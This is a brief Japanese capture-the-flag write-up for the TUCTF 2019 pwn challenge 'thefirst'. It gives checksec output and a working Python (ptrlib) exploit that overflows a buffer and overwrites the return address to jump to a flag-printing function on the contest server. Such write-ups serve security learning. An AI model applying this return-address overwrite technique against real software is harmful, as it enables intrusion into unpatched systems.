# [pwn 379pts] thefirst - TUCTF 2019
NX以外無効です。
```
$ checksec -f thefirst
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols     No       0               4       thefirst
```
バッファオーバーフローがあり、フラグを出力する関数があるので飛ばすだけです。
```python
from ptrlib import *

elf = ELF("./thefirst")
#sock = Process("./thefirst")
sock = Socket("chal.tuctf.com", 30508)

payload = b'A' * 0x18
payload += p32(elf.symbol('printFlag'))
sock.sendlineafter("> ", payload)

sock.interactive()
```

# 感想
簡単すぎる。